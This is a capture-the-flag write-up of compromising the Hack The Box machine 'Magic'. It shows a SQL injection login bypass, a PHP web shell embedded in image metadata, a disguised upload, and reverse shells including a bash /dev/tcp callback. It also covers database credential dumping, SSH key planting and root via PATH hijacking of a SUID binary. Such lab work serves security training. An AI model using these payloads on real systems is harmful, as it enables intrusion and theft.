# Scan

```bash
ghost@localhost [23:45:00] [~/Documents/hacking/tj-null-boxes/magic] [master]
-> % rustscan -a $IP -- -sC -sV

Open 10.10.10.185:22
Open 10.10.10.185:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 06d489bf51f7fc0cf9085e9763648dca (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQClcZO7AyXva0myXqRYz5xgxJ8ljSW1c6xX0vzHxP/Qy024qtSuDeQIRZGYsIR+kyje39aNw6HHxdz50XSBSEcauPLDWbIYLUMM+a0smh7/pRjfA+vqHxEp7e5l9H7Nbb1dzQesANxa1glKsEmKi1N8Yg0QHX0/FciFt1rdES9Y4b3I3gse2mSAfdNWn4ApnGnpy1tUbanZYdRtpvufqPWjzxUkFEnFIPrslKZoiQ+MLnp77DXfIm3PGjdhui0PBlkebTGbgo4+U44fniEweNJSkiaZW/CuKte0j/buSlBlnagzDl0meeT8EpBOPjk+F0v6Yr7heTuAZn75pO3l5RHX
|   256 11a69298ce3540c729094f6c2d74aa66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOVyH7ButfnaTRJb0CdXzeCYFPEmm6nkSUd4d52dW6XybW9XjBanHE/FM4kZ7bJKFEOaLzF1lDizNQgiffGWWLQ=
|   256 7105991fa81b14d6038553f8788ecb88 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0dM4nfekm9dJWdTux9TqCyCGtW5rbmHfh/4v3NtTU1
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Magic Portfolio
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# 80

Found a login page at http://10.10.10.185/login.php.

I used Brupsuite to test SQL injection, and the following payload gives 302 redirect.

```SQL
username=admin' or 1=1 -- -&password=admin
```

I will redirected back to http://10.10.10.185/upload.php.

The file seems to be uploaded directly with no rename for the file.

http://10.10.10.185/images/uploads/chad.jpg

From Feroxbuster, I got following URLs.

```bash
301      GET        9l       28w      313c http://10.10.10.185/images => http://10.10.10.185/images/
200      GET       60l      207w     4054c http://10.10.10.185/
301      GET        9l       28w      313c http://10.10.10.185/assets => http://10.10.10.185/assets/
301      GET        9l       28w      321c http://10.10.10.185/images/uploads => http://10.10.10.185/images/uploads/
301      GET        9l       28w      317c http://10.10.10.185/assets/css => http://10.10.10.185/assets/css/
301      GET        9l       28w      316c http://10.10.10.185/assets/js => http://10.10.10.185/assets/js/
301      GET        9l       28w      313c http://10.10.10.185/images => http://10.10.10.185/images/
403      GET        9l       28w      277c http://10.10.10.185/.php
200      GET       60l      207w     4052c http://10.10.10.185/index.php
200      GET      118l      277w     4221c http://10.10.10.185/login.php
301      GET        9l       28w      321c http://10.10.10.185/images/uploads => http://10.10.10.185/images/uploads/
301      GET        9l       28w      313c http://10.10.10.185/assets => http://10.10.10.185/assets/
403      GET        9l       28w      277c http://10.10.10.185/images/.php
200      GET       60l      207w     4053c http://10.10.10.185/
302      GET       84l      177w     2957c http://10.10.10.185/upload.php => login.php
302      GET        0l        0w        0c http://10.10.10.185/logout.php => index.php
301      GET        9l       28w      317c http://10.10.10.185/assets/css => http://10.10.10.185/assets/css/
403      GET        9l       28w      277c http://10.10.10.185/assets/.php
301      GET        9l       28w      316c http://10.10.10.185/assets/js => http://10.10.10.185/assets/js/
```

It seems that I cannot upload a PHP file (reverse shell or web shell).

You can look at this blog to inject PHP code into the image.

```bash
ghost@localhost [00:18:12] [~/Documents/hacking/tj-null-boxes/magic] [master *]
-> % exiftool -DocumentName="<h1>Shell<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" gigachad.jpg
    1 image files updated
```

With Burpsuite, I renamed to `gigachad.php.jpg` and upload works. Now I can access the shell at http://10.10.10.185/images/uploads/gigachad1.php.jpg?cmd=ls.

```bash
����JFIF``���ExifMM* �J��(

# Shell

chad.jpg
gigachad.jpg
gigachad1.php.jpg
giphy.gif
logo.png
magic-1424x900.jpg
magic-hat_23-2147512156.jpg
magic-wand.jpg
trx.jpg
```

I found 1 user under home.
- theseus

`http://10.10.10.185/images/uploads/gigachad.php.jpg?cmd=cat%20/etc/passwd%20|%20grep%20-v%20%27false\|nologin%27`

Shows that there are only 2 users (exclude `sync`).

```bash
����JFIF``���ExifMM* �J��(

# Shell  

root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
theseus:x:1000:1000:Theseus,,,:/home/theseus:/bin/bash
```

There's no netcat. I uploaded php reverse shell under `/images` because `/uploads` seems to be cleaning images periodically. Then I manage to get reverse shell.

```bash
ghost@localhost [00:30:41] [~/Documents/hacking/tj-null-boxes/magic] [master *]
-> % nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.185] 37984
Linux ubuntu 5.3.0-42-generic #34~18.04.1-Ubuntu SMP Fri Feb 28 13:42:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 08:30:48 up 45 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```


# User

First I looked for SUID files. (ignored `snap`)

```bash
$ find / -perm /4000 -type f 2>/dev/null
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/arping
...
/bin/umount
/bin/fusermount
/bin/sysinfo
/bin/mount
/bin/su
/bin/ping
```

From `/var/www/Magic/db.php5` I got database credentials. `theseus:iamkingtheseus` for the database `Magic`.
`
```bash
www-data@ubuntu:/var/www/Magic$ cat db.php5
cat db.php5
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
        // One connection through whole application
        if ( null == self::$cont )
        {
            try
            {
                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
            }
            catch(PDOException $e)
            {
                die($e->getMessage());
            }
        }
        return self::$cont;
    }

    public static function disconnect()
    {
        self::$cont = null;
    }
}
```

Unfortunately `mysql` command does not exists. So I need to find what database command available and found `mysqldump`.

```bash
www-data@ubuntu:/var/www/Magic$ ls /usr/bin | grep mysql
mysql_config_editor
mysql_embedded
mysql_install_db
mysql_plugin
mysql_secure_installation
mysql_ssl_rsa_setup
mysql_tzinfo_to_sql
mysql_upgrade
mysqladmin
mysqlanalyze
mysqlbinlog
mysqlcheck
mysqld_multi
mysqld_safe
mysqldump
mysqldumpslow
mysqlimport
mysqloptimize
mysqlpump
mysqlrepair
mysqlreport
mysqlshow
mysqlslap
```

So I dump the database.

```bash
www-data@ubuntu:/dev/shm$ mysqldump -u theseus -piamkingtheseus Magic
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database: Magic
-- ------------------------------------------------------
-- Server version       5.7.29-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2022-11-15  8:50:46
```

Found user `admin:Th3s3usW4sK1ng`.

I check again for password reuse and voila! it works.

```bash
www-data@ubuntu:/dev/shm$ su theseus
Password: Th3s3usW4sK1ng

theseus@ubuntu:/dev/shm$ cd ~

theseus@ubuntu:~$ cat user.txt
e1f581979abca36c446d1da10441a6da
```

I generated a SSH key and added under `.ssh`.

```bash
theseus@ubuntu:~/.ssh$ wget 10.10.14.4/ghost.pub
--2022-11-15 08:56:47--  http://10.10.14.4/ghost.pub
Connecting to 10.10.14.4:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 569 [application/vnd.exstream-package]
Saving to: ‘ghost.pub’

ghost.pub           100%[===================>]     569  --.-KB/s    in 0s

2022-11-15 08:56:47 (67.5 MB/s) - ‘ghost.pub’ saved [569/569]

theseus@ubuntu:~/.ssh$ mv ghost.pub authorized_keys
```


# Privilege escalation

So the user `theseus` does not have sudo permission.

```bash
theseus@ubuntu:~$ sudo -l
[sudo] password for theseus:
Sorry, user theseus may not run sudo on ubuntu.
```

I looked for SUID files.

```bash
theseus@ubuntu:~$ find / -perm /4000 -type f 2>/dev/null | grep -v 'snap'
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/arping
/usr/bin/vmware-user-suid-wrapper
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/bin/umount
/bin/fusermount
/bin/sysinfo
/bin/mount
/bin/su
/bin/ping
```

I run linpeas. Found an XML that might have possible private SSH key.

```bash
══╣ Possible private SSH keys were found!
/etc/ImageMagick-6/mime.xml
```

Also found an unknown SUID binary. Also the file seems to be readable by the user `theseus`. I downloaded it to my machine to inspect further.

```
-rwsr-x--- 1 root users 22K Oct 21  2019 /bin/sysinfo (Unknown SUID binary)
```

I use `ltrace` which is a debugging tool to display the calls an application makes to shared libraries. One thing I noticed is `popen` which is used to open a process.

Particularly this line

```bash
...
popen("fdisk -l", "r") 
...
```

It is calling `fdisk` without specifying an actual path. Therefore, by override `$PATH` we can make it executes our own exploit.

```bash
theseus@ubuntu:/dev/shm$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.4/4444 0>&1' > fdisk

theseus@ubuntu:/dev/shm$ chmod +x fdisk

theseus@ubuntu:/dev/shm$ export PATH="/dev/shm:$PATH"

theseus@ubuntu:/dev/shm$ echo $PATH
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

theseus@ubuntu:/dev/shm$ sysinfo
```

Then we get back a root shell.

```bash
ghost@localhost [01:58:58] [~/Documents/hacking/tj-null-boxes/magic] [master *]
-> % nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.185] 38784
root@ubuntu:/dev/shm# id
id
uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus)

root@ubuntu:/dev/shm# cat /root/root.txt
cfb71e0f31030908bb4b75c01b48d414
```
